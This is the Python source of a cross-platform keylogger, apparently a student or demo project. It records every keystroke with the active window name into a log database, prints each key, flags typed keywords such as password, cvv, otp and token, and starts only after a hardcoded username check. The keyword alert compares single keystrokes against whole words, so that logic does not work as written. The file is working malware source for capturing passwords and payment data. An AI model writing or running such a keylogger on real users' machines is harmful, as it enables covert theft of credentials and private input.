from pynput.keyboard import Listener, Key
import socket, subprocess, time, platform
from datetime import datetime
from logger_utils import init_db, insert_log

# --- Initialize DB ---
init_db()

# --- Get IP Address ---
def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except:
        return "Unknown"

# --- Get Active Window (Cross-Platform) ---
def get_active_window():
    try:
        system = platform.system()
        if system == "Darwin":  # macOS
            script = 'tell application "System Events" to get name of application processes whose frontmost is true'
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
            return result.stdout.strip()
        elif system == "Windows":
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        elif system == "Linux":
            result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'],
                                    capture_output=True, text=True)
            return result.stdout.strip()
    except:
        return "Unknown App"

# --- Sensitive Keywords ---
SENSITIVE_KEYWORDS = [  "password", "pass", "login", "signin", "user", "username",
    "card", "credit", "debit", "cvv", "pin", "upi", "bank", "account",
    "email", "phone", "mobile", "aadhaar",
    "otp", "token", "key", "secret"]

# --- Typing Anomaly Detection ---
last_time = time.time()
def detect_anomaly():
    global last_time
    current_time = time.time()
    interval = current_time - last_time
    last_time = current_time
    if interval < 0.05:  # suspiciously fast typing
        return True
    return False

# --- Key Press Event ---
def on_press(key):
    try:
        app = get_active_window()
        k = key.char if hasattr(key, 'char') and key.char else str(key)
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        insert_log(ts, app, k)  # Save encrypted log

        print(f"[LOG] {app} | {k}")  # Debug print

        # Alerts
        if any(word in k.lower() for word in SENSITIVE_KEYWORDS):
            print(f"[ALERT] Sensitive keyword typed in {app} at {ts}")
        if detect_anomaly():
            print(f"[ANOMALY] Suspicious typing detected in {app} at {ts}")

        # Exit on Esc
        if key == Key.esc:
            print("[INFO] Exiting keylogger...")
            return False

    except Exception as e:
        print("Error logging:", e)

# --- Start Listener ---
def start_keylogger():
    print(f"[INFO] Keylogger started on system with IP: {get_ip_address()}")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print(">>> Entered __main__ block")
    username = input("Enter username: ")
    if username.strip().lower() == "salman":
        print("Access granted. Starting keylogger...")
        start_keylogger()
    else:
        print("Access denied.")
